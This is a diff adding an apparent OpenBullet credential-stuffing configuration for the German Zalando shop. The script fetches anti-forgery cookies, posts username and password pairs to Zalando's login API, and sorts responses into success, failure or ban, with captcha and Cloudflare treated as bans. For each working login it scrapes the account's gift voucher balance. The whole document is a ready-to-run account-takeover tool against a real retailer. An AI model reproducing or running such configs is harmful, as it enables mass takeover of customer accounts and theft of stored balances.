@@ -1,0 +1,64 @@
+[SETTINGS]
+{
+  "Name": "Zalando DE",
+  "SuggestedBots": 1,
+  "LastModified": "2018-12-23T00:40:56.4662088+01:00",
+  "AdditionalInfo": "",
+  "Author": "KimoMaka",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://en.zalando.de/login/?view=login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<COOKIES(frsx)>" REGEX "" "" Recursive=FALSE -> VAR "xsrf" "" "" 
+PARSE "<COOKIES(Zalando-Client-Id)>" REGEX "" "" Recursive=FALSE -> VAR "client" "" "" 
+REQUEST POST "https://en.zalando.de/api/reef/login" AutoRedirect=TRUE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"wnaMode\":\"shop\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "x-xsrf-token: <xsrf>" 
+  HEADER "x-zalando-render-page-uri: /login/?view=login" 
+  HEADER "x-zalando-client-id: <client>" 
+  HEADER "x-zalando-request-uri: /login/?view=login" 
+  HEADER "x-flow-id: Techjc-IRe14lbqx" 
+  HEADER "referer: https://www.zalando.fr/login/?view=login" 
+  HEADER "origin: https://www.zalando.fr" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "{\"status\":false}" 
+    KEY "Bad Request" 
+  KEYCHAIN Success OR 
+    KEY "{\"status\":true}" 
+    KEY "firstname" 
+  KEYCHAIN Ban OR 
+    KEY "captcha" 
+    KEY "Cloudflare" 
+REQUEST GET "https://en.zalando.de/myaccount/giftvouchers/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "<div class=\"voucherAmount\">" "</h3>" Recursive=FALSE -> VAR "gift" "" "" 
+FUNCTION Replace "(.*):(\r\n|\r|\n)" "" UseRegex=TRUE "<gift>" -> CAP "Balance" 
